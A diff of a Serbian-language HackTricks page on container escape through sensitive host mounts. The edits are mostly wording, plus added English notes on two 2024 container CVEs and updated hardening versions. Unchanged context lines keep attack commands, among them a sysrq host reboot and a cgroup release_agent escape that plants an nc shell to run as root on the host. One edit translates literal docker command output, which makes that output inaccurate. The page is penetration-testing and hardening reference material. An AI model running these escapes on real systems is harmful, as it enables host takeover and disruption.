@@ -16,7 +16,7 @@ Ovaj direktorijum omogućava pristup za modifikaciju kernel varijabli, obično p
 
 - Opisano u [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
 - Ako možete da pišete unutar ove datoteke, moguće je napisati cevi `|` praćene putanjom do programa ili skripte koja će biti izvršena nakon što dođe do kvara.
-- Napadač može pronaći putanju unutar hosta do svog kontejnera izvršavajući `mount` i napisati putanju do binarne datoteke unutar svog kontejnerskog datotečnog sistema. Zatim, izazvati kvar programa kako bi naterao kernel da izvrši binarnu datoteku van kontejnera.
+- Napadač može pronaći putanju unutar hosta do svog kontejnera izvršavajući `mount` i napisati putanju do binarnog fajla unutar svog kontejnerskog fajl sistema. Zatim, izazvati kvar programa kako bi naterao kernel da izvrši binarni fajl van kontejnera.
 
 - **Primer testiranja i eksploatacije**:
 ```bash
@@ -103,13 +103,13 @@ echo b > /proc/sysrq-trigger # Restartuje host
 
 - Predstavlja fizičku memoriju sistema u ELF core formatu.
 - Čitanje može otkriti sadržaj memorije host sistema i drugih kontejnera.
-- Velika veličina datoteke može dovesti do problema sa čitanjem ili rušenja softvera.
+- Velika veličina datoteke može dovesti do problema sa čitanjem ili rušenjem softvera.
 - Detaljna upotreba u [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 #### **`/proc/kmem`**
 
 - Alternativni interfejs za `/dev/kmem`, koji predstavlja kernel virtuelnu memoriju.
-- Omogućava čitanje i pisanje, što znači direktnu modifikaciju kernel memorije.
+- Omogućava čitanje i pisanje, što omogućava direktnu modifikaciju kernel memorije.
 
 #### **`/proc/mem`**
 
@@ -131,7 +131,7 @@ echo b > /proc/sysrq-trigger # Restartuje host
 #### **`/sys/kernel/uevent_helper`**
 
 - Koristi se za rukovanje kernel uređajima `uevents`.
-- Pisanje u `/sys/kernel/uevent_helper` može izvršiti proizvoljne skripte prilikom aktiviranja `uevent`-a.
+- Pisanje u `/sys/kernel/uevent_helper` može izvršiti proizvoljne skripte prilikom aktiviranja `uevent`.
 - **Primer za eksploataciju**:
 ```bash
 
@@ -263,7 +263,7 @@ the other containers' filesystems are available under a different base path:
 
 ```bash
 $ docker info | grep -i 'docker root\|storage driver'
-Storage Driver: overlay2
+Skladišni drajver: overlay2
 Docker Root Dir: /var/lib/docker
 ```
 
@@ -293,7 +293,8 @@ Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent 
 ```text
 /run/containerd/containerd.sock     # containerd CRI soket  
 /var/run/crio/crio.sock             # CRI-O runtime soket  
-/run/podman/podman.sock             # Podman API (sa root privilegijama ili bez)  
+/run/podman/podman.sock             # Podman API (rootful ili rootless)  
+/run/buildkit/buildkitd.sock        # BuildKit daemon (rootful)  
 /var/run/kubelet.sock               # Kubelet API na Kubernetes čvorovima  
 /run/firecracker-containerd.sock    # Kata / Firecracker
 ```
@@ -319,7 +320,7 @@ mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
 echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # zahteva CVE-2022-0492
 
 echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
-sh -c "echo 0 > /tmp/x/cgroup.procs"  # pokreće događaj praznog cgrupa
+sh -c "echo 0 > /tmp/x/cgroup.procs"  # aktivira događaj praznog cgrupa
 ```
 
 When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.
@@ -327,7 +328,7 @@ When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**
 ### Mount-Related Escape CVEs (2023-2025)
 
 * **CVE-2024-21626 – runc “Leaky Vessels” file-descriptor leak**
-runc ≤1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥25.0.3, containerd ≥1.7.14).
+runc ≤ 1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥ 25.0.3, containerd ≥ 1.7.14).
 
 ```Dockerfile
 FROM scratch
@@ -338,11 +339,17 @@ CMD ["/bin/sh"]
 * **CVE-2024-23651 / 23653 – BuildKit OverlayFS copy-up TOCTOU**
 A race condition in the BuildKit snapshotter let an attacker replace a file that was about to be *copy-up* into the container’s rootfs with a symlink to an arbitrary path on the host, gaining write access outside the build context. Fixed in BuildKit v0.12.5 / Buildx 0.12.0. Exploitation requires an untrusted `docker build` on a vulnerable daemon.
 
+* **CVE-2024-1753 – Buildah / Podman bind-mount breakout during `build`**
+Buildah ≤ 1.35.0 (and Podman ≤ 4.9.3) incorrectly resolved absolute paths passed to `--mount=type=bind` in a *Containerfile*. A crafted build stage could mount `/` from the host **read-write** inside the build container when SELinux was disabled or in permissive mode, leading to full escape at build time. Patched in Buildah 1.35.1 and the corresponding Podman 4.9.4 back-port series.
+
+* **CVE-2024-40635 – containerd UID integer overflow**
+Supplying a `User` value larger than `2147483647` in an image config overflowed the 32-bit signed integer and started the process as UID 0 inside the host user namespace. Workloads expected to run as non-root could therefore obtain root privileges. Fixed in containerd 1.6.38 / 1.7.27 / 2.0.4.
+
 ### Hardening Reminders (2025)
 
 1. Bind-mount host paths **read-only** whenever possible and add `nosuid,nodev,noexec` mount options.
 2. Prefer dedicated side-car proxies or rootless clients instead of exposing the runtime socket directly.
-3. Keep the container runtime up-to-date (runc ≥1.1.12, BuildKit ≥0.12.5, containerd ≥1.7.14).
+3. Keep the container runtime up-to-date (runc ≥ 1.1.12, BuildKit ≥ 0.12.5, Buildah ≥ 1.35.1 / Podman ≥ 4.9.4, containerd ≥ 1.7.27).
 4. In Kubernetes, use `securityContext.readOnlyRootFilesystem: true`, the *restricted* PodSecurity profile and avoid `hostPath` volumes pointing to the paths listed above.
 
 ### References
@@ -352,5 +359,7 @@ A race condition in the BuildKit snapshotter let an attacker replace a file that
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
 - [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
 - [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
+- [Buildah CVE-2024-1753 advisory](https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf)
+- [containerd CVE-2024-40635 advisory](https://github.com/containerd/containerd/security/advisories/GHSA-265r-hfxg-fhmg)
 
 {{#include ../../../../banners/hacktricks-training.md}}
